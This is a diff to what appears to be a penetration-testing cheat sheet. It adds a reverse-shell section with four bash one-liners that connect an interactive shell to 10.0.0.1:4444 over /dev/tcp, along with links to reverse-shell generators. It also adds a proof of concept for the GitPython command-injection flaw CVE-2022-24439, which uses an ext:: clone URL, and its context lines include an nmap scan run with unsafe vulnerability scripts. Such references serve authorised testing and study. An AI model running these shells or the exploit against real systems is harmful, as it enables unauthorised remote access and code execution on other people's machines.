@@ -41,6 +41,18 @@ sudo nmap -v -sS -Pn --script=vuln --script-args=unsafe=1 <target_ip>
 
 ## Reverse shell
 
+### [Reverse Shell Generator](https://www.revshells.com/)
+
+### [Reverse Shell Cheat Sheet - Internal All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
+
+### Bash
+```bash
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+/bin/bash -l > /dev/tcp/10.0.0.1/4444 0<&1 2>&1
+bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
+/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
+```
+
 ### Upgrade Shell
 
 ```bash
@@ -259,4 +271,17 @@ ps aux | grep remote-debugging-port
 # Use netstat to find potential Chrome-related ports and brute force them
 netstat -tuln
 ```
+
+# CVEs
+
+## CVE-2022-24439 - GitPython RCE
+- Affecting gitpython package, versions [0,3.1.30)
+```python
+# PoC
+from git import Repo
+r = Repo.init('', bare=True)
+r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])
+```
+> https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
+
 
